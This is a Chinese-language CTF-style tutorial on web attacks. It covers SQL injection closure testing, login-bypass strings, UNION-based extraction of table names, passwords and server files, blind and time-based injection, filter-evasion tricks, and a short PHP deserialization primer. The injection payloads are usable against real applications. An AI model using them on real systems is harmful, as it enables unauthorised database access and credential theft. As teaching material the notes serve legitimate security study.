
# Web 专题

## Web 专题一 SQL注入

### SQL注入基础

常见 SQL 查询语句： 

- `$sql=select xxx from xxx where ...`
	- `user='$username' and password='$password'`
	- `id=$id`

在进行 SQL 注入之前，首先需要搞清楚 SQL 查询语句的闭合方式，即是单引号闭合、双引号闭合还是数字类型

具体而言：

- 如果输入 `'` 没有报错(报错显示什么得看源代码的结构)，那么查询语句一般是双引号闭合
	- 构成 `select xxx from xxx where user="'"`
- 如果输入 `"` 没有报错，那么查询语句一般是单引号闭合
	- 构成 `select xxx from xxx where user='"'`
- 如果上述两个方式都报错了，那么很可能是数字类型
	- 构成 `select xxx from xxx where id='`

!!! warning "上述只是一般论，实战中请做好自己的判断"

知道闭合类型后，就可以开始尝试构建一个能够返回数据的 payload 了

由于数字类型的 SQL 查询非常少见，我们演示的均为 *单引号闭合类型* ，比如一个非常常见的注入方式： `' or ''='`

此时，替换得到的查询语句为 `select xxx from xxx where user='' or ''=''` ，条件恒为 **True** 

常见的万能密码如下，不过一般也没什么大用处

- `admin' -- `
- `admin' #`
- `admin'/*`
- `' or 1=1-- `
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1-- `
- `') or ('1'='1-- `

!!! tip "`--` 后面需要加一个空格才能起到注释作用"

### 基本注入方式

SQL 的注入分为 **有回显** 和 **无回显** ，其二者所需要的注入方式大不相同

#### 有回显注入

有回显，顾名思义就是会返回你查询到的数据。对于此种注入，最常见的方法就是使用 `UNION SELECT` 联合查询自己想要得到的数据

由于我们一般不清楚查询的表单会返回多少字段数据，所以在 `UNION SELECT` 之前，一般要用 `ORDER BY` 来测试，`ORDER BY n` 当你查询到的字段数大于 n ，不会报错；反之，则会报错，藉此确定我们 `UNION SELECT` 后要接多少条数据

!!! note "不用 ORDER BY 也可以"
	事实上，你也可以直接选择 `UNION SELECT 1,2,3,...` ，一直试到报错即可

确定字段数后，就可以为所欲为的爆出数据库的信息了，下面均以字段数为 1 的有回显注入为例子：

假设有查询语句： 
`$SQL=select xxx from xxx where user=''`

- `admin' union select DATABASE()#` 
	- 爆出数据库名
- `admin' union select group_concat(table_name) from information_schema.tables where table_schema=DATABASE()#`
	- MySQL 中有 `infomation_schema` ，存储着该数据库里面表单的各种数据
	- 爆出该数据库内的所有表名
- `admin' union select GROUP_CONCAT(PASSWORD) FROM USERS)#`
	- 假设该数据库内有表单名为 `USERS` ，且有列名为 `PASSWORD`
	- 其实列名也可以通过类似方式在 `infomation_schema` 中爆出，请自行探索
	- 爆出表中的所有 `PASSWORD`
- `admin' union select load_file('/home/flag.txt')#`
	- 读取服务器上文件数据
	- 在对方服务器允许的情况下，什么可以使用 `into file` 来写入文件(一般不允许就是了)

注入常见参数如下：

- `user()`：当前数据库用户
- `database()`：当前数据库名
- `version()`：当前使用的数据库版本
- `@@datadir`：数据库存储数据路径
- `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`
- `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
- `concat_ws()`：用法类似
- `hex()` 和 `unhex()`：用于 hex 编码解码
- `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`
- `select xxoo into outfile '路径'`：权限较高时可直接写文件

#### 无回显注入

无回显注入是看不到你查询到的数据是如何的，有些题目的报错界面甚至就是一个空白，但是我们仍然可以利用 `SUBSTR` 函数来对其进行判断

假设有一个登录界面，只有你登录成功的时候会有消息提示，且查询语句为 `select xxx from xxx where user='$username' and password='$password'` 那么：

- `password=111&username=0' or ascii(substr(DATABASE(),1,1))>96#`
	- 判断 DATABASE() 的第一位字符的ASCII码是否大于96，是的话返回登录成功
	- 后面关于 password 的判定直接被注释掉了，所以无关大雅
- 其它注入与有回显类似，只是方式不同，且麻烦了些

!!! quote "SLEEP"
	有时，还可以选择使用 `SLEEP` 函数来实现对结果的判断，`password=111&username=admin' and if(ascii(substr(DATABASE(),1,1))>0,sleep(2),sleep(5))#`
	
	注意，if 语句前需要使用 and 而不能是 or ，因为用 or 的话每次会遍历一遍表单，没有一行数据都会对 if 进行一次判断，导致延时过久

### 注入检测的绕过

#### 同义词替换

- `and` **=>** `&&`
- `or` **=>** `||`
- `Space` **=>** `/**/` (或写一个更加复杂的注释，如 `/*//+-*/`)

#### 大小写绕过

由于 SQL 一般不区分大小写，所以如果题目对查询语句正则，有时可以将被过滤的管检测改为大小写混乱分布，如 `UnIoN` 

#### 可执行注释

在 MySQL 中，`/*!50000 */` 这种格式的注释，在 MySQL 版本大于 5.00.00 的时候是会执行注释内部的语句的，根据自己需求把 50000 改成其它数字即可，但要注意一定是五位数


#### URL编码编码绕过

在 BurpSuite 中通过改包上传数据时，可以用 URL 编码替换等价字符来尝试绕过对关键词的检测

如下为常用URL编码：

- `Space` : %20
- `#` :  %23
- `'` :  %27
- `"` :  %22
- `+` :  %2B

有些服务器支持二次编码，比如 `%%37%63%%37%63` 最终会变为 `||` (or)

!!! tip "#+$-\_.!\*() 浏览器地址栏默认不编码，但是不意味着不能编码"



## Web 专题二 反序列化

php 将数据序列化和反序列化会用到两个函数

- **serialize** 将对象格式化成有序的字符串
- **unserialize** 将字符串还原成原来的对象

!!! quote "在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。"

一个简单的例子如下：

```php
<?php
$user=array('xiao','shi','zi');
$user=serialize($user);
echo($user.PHP_EOL);
print_r(unserialize($user));
?>
/* Output
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
Array
(
    [0] => xiao
    [1] => shi
    [2] => zi
)
*
*上面输出中，i代表整型数据 int ，s代表字符串，后接长度
*/
```

---

```php
<?php
 
class FileHandler {
    public  $op = 2;
    public  $filename = "flag.php";
}
 
$a = new FileHandler();
$b = serialize($a);
echo $b;
 
?>
# Output: O:11:"FileHandler":2:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";}
```